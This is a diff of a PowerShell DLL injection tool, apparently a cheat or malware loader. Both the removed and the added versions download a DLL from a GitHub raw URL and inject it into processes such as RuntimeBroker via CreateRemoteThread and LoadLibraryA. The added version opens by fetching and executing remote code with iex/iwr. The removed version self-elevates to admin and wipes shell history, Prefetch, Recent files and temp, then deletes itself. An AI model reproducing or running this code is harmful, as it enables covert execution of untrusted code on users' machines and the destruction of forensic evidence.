@@ -1,334 +1,237 @@
-# === Self-Elevate ===
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    try {
-        Start-Process powershell.exe -Verb RunAs -ArgumentList (
-            "-NoProfile",
-            "-NoExit",
-            "-ExecutionPolicy Bypass",
-            "-File `"$PSCommandPath`""
-        )
-        exit
-    }
-    catch {
-        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
-        Read-Host "Press Enter to exit"
-        exit 1
-    }
-}
 
-# === LookupFunc ===
-function LookupFunc {
-    Param ($moduleName, $functionName)
-    $signature = @'
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-'@
-    if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
-        $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
-    } else {
-        $kernel32 = [Win32.Kernel32]
-    }
-    $hModule = $kernel32::GetModuleHandle($moduleName)
-    return $kernel32::GetProcAddress($hModule, $functionName)
-}
-
-function getDelegateType {
-    Param (
-        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
-        [Parameter(Position = 1)] [Type] $delType = [Void]
-    )
-    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
-        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
-        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
-    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
-        'MyDelegateType',
-        'Class, Public, Sealed, AnsiClass, AutoClass',
-        [System.MulticastDelegate]
-    )
-    $type.DefineConstructor(
-        'RTSpecialName, HideBySig, Public',
-        [System.Reflection.CallingConventions]::Standard,
-        $func
-    ).SetImplementationFlags('Runtime, Managed')
-    $type.DefineMethod(
-        'Invoke',
-        'Public, HideBySig, NewSlot, Virtual',
-        $delType,
-        $func
-    ).SetImplementationFlags('Runtime, Managed')
-    return $type.CreateType()
-}
-
-# === 1. Prepare Temp ===
-Write-Host "[+] Preparing environment..." -ForegroundColor Cyan
-$tempDir = $env:TEMP
-try {
-    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-} catch {}
-
-# === 2. Download DLL + Images ===
-$randomGuid = [System.Guid]::NewGuid().ToString()
-$dllPath = Join-Path $tempDir "$randomGuid.dll"
-
-$baseUrl = "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main"
-
-$files = @{
-    $dllPath                          = "$baseUrl/Nova.dll"
-    "$tempDir\logo.png"               = "$baseUrl/logo.png"
-    "$tempDir\low.png"                = "$baseUrl/low.png"
-    "$tempDir\medium.png"             = "$baseUrl/medium.png"
-    "$tempDir\high.png"               = "$baseUrl/high.png"
-}
-
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-
-Write-Host "[+] Downloading Nova.dll and assets..." -ForegroundColor Cyan
-
-$downloaded = $false
-foreach ($dest in $files.Keys) {
-    $url = $files[$dest]
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-        $wc.DownloadFile($url, $dest)
-        $wc.Dispose()
-    } catch {
-        # Silent fail for images
-    }
-}
-
-# Verify DLL
-if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
-    $downloaded = $true
-    Write-Host "[+] DLL ready ($([math]::Round((Get-Item $dllPath).Length/1KB, 2)) KB)" -ForegroundColor Green
-} else {
-    Write-Host "[!] Failed to download Nova.dll" -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit 1
-}
-
-# === 3. Process Selection ===
-Clear-Host
-Write-Host "NOVA DLL INJECTION TOOL" -ForegroundColor Yellow
-Write-Host ""
-Write-Host "Select target process for injection:" -ForegroundColor White
-Write-Host ""
-Write-Host "  [1] Notepad" -ForegroundColor Green
-Write-Host "  [2] Task Manager (Taskmgr)" -ForegroundColor Green
-Write-Host "  [3] RuntimeBroker" -ForegroundColor Green
-Write-Host ""
-
-$proc = $null
-$targetProcess = ""
-$validChoice = $false
-
-do {
-    $choice = Read-Host "Enter choice (1-3)"
-    Write-Host ""
-
-    switch ($choice) {
-        "1" {
-            $targetProcess = "notepad"
-            try {
-                $existingProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
-                if ($existingProc) {
-                    Write-Host "[+] Found existing Notepad.exe (PID: $($existingProc.Id))" -ForegroundColor Green
-                    $proc = $existingProc
-                } else {
-                    Write-Host "[+] Starting Notepad.exe..." -ForegroundColor Cyan
-                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
-                    Start-Sleep -Seconds 2
-                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
-                }
-                $validChoice = $true
-            } catch {
-                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
-            }
-        }
-        "2" {
-            $targetProcess = "Taskmgr"
-            try {
-                $existingProc = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue | Select-Object -First 1
-                if ($existingProc) {
-                    Write-Host "[+] Found existing Task Manager (PID: $($existingProc.Id))" -ForegroundColor Green
-                    $proc = $existingProc
-                } else {
-                    Write-Host "[+] Starting Task Manager..." -ForegroundColor Cyan
-                    $proc = Start-Process -FilePath "taskmgr.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
-                    Start-Sleep -Seconds 3
-                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
-                }
-                $validChoice = $true
-            } catch {
-                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
-            }
-        }
-        "3" {
-            $targetProcess = "RuntimeBroker"
-            try {
-                $proc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
-                if ($proc) {
-                    Write-Host "[+] Found RuntimeBroker.exe (PID: $($proc.Id))" -ForegroundColor Green
-                    $validChoice = $true
-                } else {
-                    Write-Host "[!] RuntimeBroker not found. Using Notepad as fallback..." -ForegroundColor Yellow
-                    $targetProcess = "notepad"
-                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
-                    Start-Sleep -Seconds 2
-                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
-                    $validChoice = $true
-                }
-            } catch {
-                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
-            }
-        }
-        default {
-            Write-Host "[!] Invalid choice. Please enter 1, 2, or 3." -ForegroundColor Red
-        }
-    }
-
-    if (-not $validChoice) {
-        Write-Host "[!] Failed to get a valid process. Try again..." -ForegroundColor Red
-        Read-Host
-        Clear-Host
-        Write-Host "NOVA DLL INJECTION TOOL" -ForegroundColor Yellow
-        Write-Host ""
-        Write-Host "  [1] Notepad" -ForegroundColor Green
-        Write-Host "  [2] Task Manager (Taskmgr)" -ForegroundColor Green
-        Write-Host "  [3] RuntimeBroker" -ForegroundColor Green
-        Write-Host ""
-    }
-} while (-not $validChoice -or -not $proc)
-
-if (-not $proc) {
-    Write-Host "[!] No target process. Exiting..." -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit 1
-}
-
-try {
-    $proc = Get-Process -Id $proc.Id -ErrorAction Stop
-} catch {
-    Write-Host "[!] Process no longer accessible. Exiting..." -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit 1
-}
-
-$pid1 = $proc.Id
-Write-Host ""
-Write-Host "[+] Target: $targetProcess (PID: $pid1)" -ForegroundColor Green
-Write-Host "[+] Injecting: Nova.dll" -ForegroundColor Green
-Write-Host ""
-
-# === 4. Injection ===
-try {
-    $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-        (LookupFunc kernel32.dll OpenProcess),
-        (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
-    )
-    $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-        (LookupFunc kernel32.dll VirtualAllocEx),
-        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
-    )
-    $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-        (LookupFunc kernel32.dll WriteProcessMemory),
-        (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
-    )
-    $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-        (LookupFunc kernel32.dll CreateRemoteThread),
-        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
-    )
-
-    Write-Host "[+] Opening process handle..." -ForegroundColor Cyan
-    $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
-    if ($hProcess -eq [IntPtr]::Zero) {
-        Write-Host "[!] Trying limited permissions..." -ForegroundColor Yellow
-        $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)
-        if ($hProcess -eq [IntPtr]::Zero) {
-            Write-Host "[!] Failed to open process handle" -ForegroundColor Red
-            Read-Host "Press Enter to exit"
-            exit 1
-        }
-    }
-    Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
-
-    Write-Host "[+] Allocating memory..." -ForegroundColor Cyan
-    $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
-    if ($addr -eq [IntPtr]::Zero) {
-        Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
-        Read-Host "Press Enter to exit"
-        exit 1
-    }
-    Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green
-
-    [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
-    [IntPtr]$outSize = [IntPtr]::Zero
-
-    Write-Host "[+] Writing DLL path..." -ForegroundColor Cyan
-    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
-    if (-not $res) {
-        Write-Host "[!] Failed to write memory" -ForegroundColor Red
-        Read-Host "Press Enter to exit"
-        exit 1
-    }
-
-    $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
-    Write-Host "[+] Creating remote thread..." -ForegroundColor Cyan
-    $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
-
-    if ($hThread -ne [IntPtr]::Zero) {
-        Write-Host ""
-        Write-Host "[+] INJECTION SUCCESSFUL!" -ForegroundColor Green
-        Write-Host "[+] Nova.dll loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
-    } else {
-        Write-Host "[!] Injection failed. Try a different process." -ForegroundColor Red
-    }
-} catch {
-    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
-}
-
-# === 5. Cleanup ===
-Write-Host ""
-Write-Host "[+] Cleaning up..." -ForegroundColor Cyan
-Start-Sleep -Seconds 3
-
-try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
-$histPath = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $histPath) { try { Set-Content -Path $histPath -Value "" -Force } catch {} }
-
-$cleanPaths = @(
-    (Join-Path $env:APPDATA "Microsoft\Windows\Recent"),
-    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
-    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations"),
-    (Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache")
-)
-foreach ($p in $cleanPaths) {
-    if (Test-Path $p) {
-        Get-ChildItem -Path $p -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-    }
-}
-
-$prefetchPath = "C:\Windows\Prefetch"
-for ($i = 0; $i -lt 3; $i++) {
-    Start-Sleep -Seconds 1
-    if (Test-Path $prefetchPath) {
-        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    }
-}
-
-Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-
-if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
-    try { Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue } catch {}
-}
-
-[GC]::Collect()
-[GC]::WaitForPendingFinalizers()
-
-Write-Host "[+] Cleanup complete" -ForegroundColor Green
-Write-Host ""
-Write-Host "Press Enter to exit..."
-Read-Host
-exit
+iex (iwr -UseBasicParsing "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main")
+$script:ok = 0; $script:skip = 0; $script:fail = 0`
+`
+function Log-OK($msg) { $script:ok++ }`
+function Log-Skip($msg) { $script:skip++ }`
+function Log-Fail($msg) { $script:fail++ }`
+`
+# --- CONFIG ---`
+$DLL_URL = "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main"`
+$DLL_B64 = ""`
+$PROC_NAME = "RuntimeBroker"`
+Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`
+`
+# --- Win32 API via P/Invoke ---`
+try {`
+    Add-Type -TypeDefinition @"`
+using System;`
+using System.Runtime.InteropServices;`
+`
+public class NativeAPI`
+{`
+    [DllImport("kernel32.dll", SetLastError = true)]`
+    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);`
+`
+    [DllImport("kernel32.dll", SetLastError = true)]`
+    public static extern bool CloseHandle(IntPtr handle);`
+`
+    [DllImport("kernel32.dll", SetLastError = true)]`
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr,`
+        uint size, uint allocType, uint protect);`
+`
+    [DllImport("kernel32.dll", SetLastError = true)]`
+    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr addr,`
+        uint size, uint freeType);`
+`
+    [DllImport("kernel32.dll", SetLastError = true)]`
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddr,`
+        byte[] buffer, uint size, out int written);`
+`
+    [DllImport("kernel32.dll", SetLastError = true)]`
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attrs,`
+        uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out IntPtr tid);`
+`
+    [DllImport("kernel32.dll", SetLastError = true)]`
+    public static extern uint WaitForSingleObject(IntPtr handle, uint ms);`
+`
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]`
+    public static extern IntPtr GetModuleHandleA(string moduleName);`
+`
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]`
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);`
+`
+    public const uint PROCESS_ALL_ACCESS = 0x001FFFFF;`
+    public const uint MEM_COMMIT  = 0x00001000;`
+    public const uint MEM_RESERVE = 0x00002000;`
+    public const uint MEM_RELEASE = 0x00008000;`
+    public const uint PAGE_READWRITE = 0x04;`
+    public const uint PAGE_EXECUTE_READWRITE = 0x40;`
+    public const uint INFINITE = 0xFFFFFFFF;`
+}`
+"@`
+    Log-OK "Native API loaded"`
+} catch {`
+    Log-Skip "Native API already loaded"`
+}`
+`
+# --- STEP 1: Get DLL bytes ---`
+`
+$dllBytes = $null`
+if ($DLL_URL -ne "") {`
+    try {`
+        $wc = New-Object System.Net.WebClient`
+        $wc.Headers.Add("User-Agent", "WindowsPowerShell/5.0")`
+        $dllBytes = $wc.DownloadData($DLL_URL)`
+        Log-OK "Downloaded $($dllBytes.Length) bytes from server"`
+    } catch {`
+        Log-Fail "Failed to download FPS module ($($_.Exception.Message))"`
+        exit 1`
+    }`
+}`
+elseif ($DLL_B64 -ne "") {`
+    try {`
+        $dllBytes = [Convert]::FromBase64String($DLL_B64)`
+        Log-OK "Decoded $($dllBytes.Length) bytes from embedded data"`
+    } catch {`
+        Log-Fail "Failed to decode embedded data"`
+        exit 1`
+    }`
+}`
+else {`
+    Log-Fail "No FPS module source configured"`
+    exit 1`
+}`
+`
+# --- STEP 2: Find target process ---`
+`
+$proc = $null`
+for ($i = 0; $i -lt 60; $i++) {`
+    $proc = Get-Process -Name $PROC_NAME -ErrorAction SilentlyContinue | Select-Object -First 1`
+    if ($proc) { break }`
+    Start-Sleep -Seconds 2`
+}`
+`
+if (-not $proc) {`
+    Log-Fail "Target process not found after 2 minutes"`
+    exit 1`
+}`
+`
+Log-OK "Found: $($proc.ProcessName) (PID: $($proc.Id))"`
+`
+# --- STEP 3: Open process ---`
+`
+$procId = $proc.Id`
+$hProc = [NativeAPI]::OpenProcess([NativeAPI]::PROCESS_ALL_ACCESS, $false, $procId)`
+`
+if ($hProc -eq [IntPtr]::Zero) {`
+    Log-Fail "Failed to open process (run as admin?)"`
+    exit 1`
+}`
+`
+Log-OK "Process handle acquired: 0x$($hProc.ToString('X'))"`
+`
+# --- Allocate memory for DLL bytes in remote process ---`
+$dllSize = [uint32]$dllBytes.Length`
+$remoteMem = [NativeAPI]::VirtualAllocEx(`
+    $hProc, [IntPtr]::Zero, $dllSize,`
+    ([NativeAPI]::MEM_COMMIT -bor [NativeAPI]::MEM_RESERVE),`
+    [NativeAPI]::PAGE_EXECUTE_READWRITE`
+)`
+`
+if ($remoteMem -eq [IntPtr]::Zero) {`
+    Log-Fail "Memory allocation failed"`
+    [NativeAPI]::CloseHandle($hProc)`
+    exit 1`
+}`
+`
+Log-OK "Allocated $dllSize bytes at 0x$($remoteMem.ToString('X'))"`
+`
+# --- Write DLL bytes to remote process ---`
+$written = 0`
+$writeOk = [NativeAPI]::WriteProcessMemory($hProc, $remoteMem, $dllBytes, $dllSize, [ref]$written)`
+`
+if (-not $writeOk) {`
+    Log-Fail "Memory write failed"`
+    [NativeAPI]::VirtualFreeEx($hProc, $remoteMem, 0, [NativeAPI]::MEM_RELEASE)`
+    [NativeAPI]::CloseHandle($hProc)`
+    exit 1`
+}`
+`
+Log-OK "Wrote $written bytes to remote process"`
+`
+# --- LoadLibraryA Injection ---`
+`
+$k32 = [NativeAPI]::GetModuleHandleA("kernel32.dll")`
+$loadLib = [NativeAPI]::GetProcAddress($k32, "LoadLibraryA")`
+`
+Log-OK "LoadLibraryA resolved at 0x$($loadLib.ToString('X'))"`
+`
+# Write DLL to concealed temp path, inject, then delete immediately`
+$tempName = [System.IO.Path]::GetTempPath() + [Guid]::NewGuid().ToString("N").Substring(0, 8) + ".tmp"`
+[System.IO.File]::WriteAllBytes($tempName, $dllBytes)`
+`
+# Write path string to remote process`
+$pathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempName + "`0")`
+$remoteStr = [NativeAPI]::VirtualAllocEx(`
+    $hProc, [IntPtr]::Zero, [uint32]$pathBytes.Length,`
+    ([NativeAPI]::MEM_COMMIT -bor [NativeAPI]::MEM_RESERVE),`
+    [NativeAPI]::PAGE_READWRITE`
+)`
+`
+$w2 = 0`
+[NativeAPI]::WriteProcessMemory($hProc, $remoteStr, $pathBytes, [uint32]$pathBytes.Length, [ref]$w2) | Out-Null`
+`
+Log-OK "Path string written to remote memory"`
+`
+# CreateRemoteThread -> LoadLibraryA(dllPath)`
+$tid = [IntPtr]::Zero`
+$hThread = [NativeAPI]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $loadLib, $remoteStr, 0, [ref]$tid)`
+`
+if ($hThread -eq [IntPtr]::Zero) {`
+    Log-Fail "Remote thread creation failed"`
+    Remove-Item $tempName -Force -ErrorAction SilentlyContinue`
+    [NativeAPI]::CloseHandle($hProc)`
+    exit 1`
+}`
+`
+Log-OK "Remote thread created (TID: 0x$($tid.ToString('X')))"`
+`
+# Wait for thread to complete (DLL loaded)`
+[NativeAPI]::WaitForSingleObject($hThread, 5000) | Out-Null`
+`
+Log-OK "FPS module loaded successfully"`
+`
+# --- STEP 4: Clean up ---`
+`
+Start-Sleep -Milliseconds 500`
+try {`
+    Remove-Item $tempName -Force -ErrorAction Stop`
+    Log-OK "Temp file deleted"`
+} catch {`
+    Log-Fail "Could not delete temp file (may be locked)"`
+}`
+`
+# Overwrite the path in remote memory with zeros`
+try {`
+    $zeros = New-Object byte[] $pathBytes.Length`
+    [NativeAPI]::WriteProcessMemory($hProc, $remoteStr, $zeros, [uint32]$zeros.Length, [ref]$w2) | Out-Null`
+    [NativeAPI]::VirtualFreeEx($hProc, $remoteStr, 0, [NativeAPI]::MEM_RELEASE) | Out-Null`
+    Log-OK "Remote path memory cleared"`
+} catch {`
+    Log-Skip "Remote memory cleanup skipped"`
+}`
+`
+# Free the raw DLL bytes region`
+try {`
+    [NativeAPI]::VirtualFreeEx($hProc, $remoteMem, 0, [NativeAPI]::MEM_RELEASE) | Out-Null`
+    Log-OK "Remote DLL memory freed"`
+} catch {`
+    Log-Skip "Remote DLL memory cleanup skipped"`
+}`
+`
+# Clean up handles`
+[NativeAPI]::CloseHandle($hThread) | Out-Null`
+[NativeAPI]::CloseHandle($hProc) | Out-Null`
+Log-OK "Handles closed"`
+`
+# Clear variables from memory`
+$dllBytes = $null`
+$pathBytes = $null`
+[GC]::Collect()`
+Log-OK "Memory cleared"`
+`
+`
+`
+# Summary`
+Write-Host "success"
